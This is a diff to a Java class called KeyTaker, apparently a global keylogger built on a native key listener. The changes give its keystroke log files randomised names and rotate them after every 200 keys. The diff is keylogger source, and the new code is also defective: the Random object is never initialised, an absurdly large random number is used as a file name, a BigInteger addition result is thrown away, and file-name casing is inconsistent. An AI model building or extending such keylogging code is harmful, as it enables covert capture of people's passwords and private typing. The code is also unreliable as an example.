@@ -4,6 +4,8 @@ import java.io.FileWriter;
 import java.io.IOException;
 import java.io.PrintWriter;
 import java.util.Scanner;
+import java.math.BigInteger;
+import java.util.Random;
 
 import java.util.logging.Level;
 import java.util.logging.LogManager;
@@ -25,12 +27,15 @@ public class KeyTaker implements NativeKeyListener {
 	//need to put fw outside of try catch 
 	PrintWriter pw;
 	Scanner sc;
+	Random rnd;
+	
+	
 	static int times = 0;
-	static int files = 1;
+	BigInteger files = new BigInteger(300000000, rnd);
 	
 	//OPEN A FILE
 	public KeyTaker() throws IOException {
-		file = new File("keys1.txt");
+		file = new File("Keys" + files.toString() + ".txt");
 		file.createNewFile();
 		// 2) FileWriter
 		fw = null;
@@ -61,9 +66,9 @@ public class KeyTaker implements NativeKeyListener {
 			
 		
 		times++;
-		if(times >= 6000) {
+		if(times >= 200) {
 			times = times%10;
-			files++;
+			files.add(new BigInteger("1"));
 			
 			//closing scanner and filewriter
 			try {
@@ -74,6 +79,7 @@ public class KeyTaker implements NativeKeyListener {
 			}
 			pw.close();
 			sc.close();
+			
 			
 			//setting up next file name and new file
 			String name = "keys" + files + ".txt";
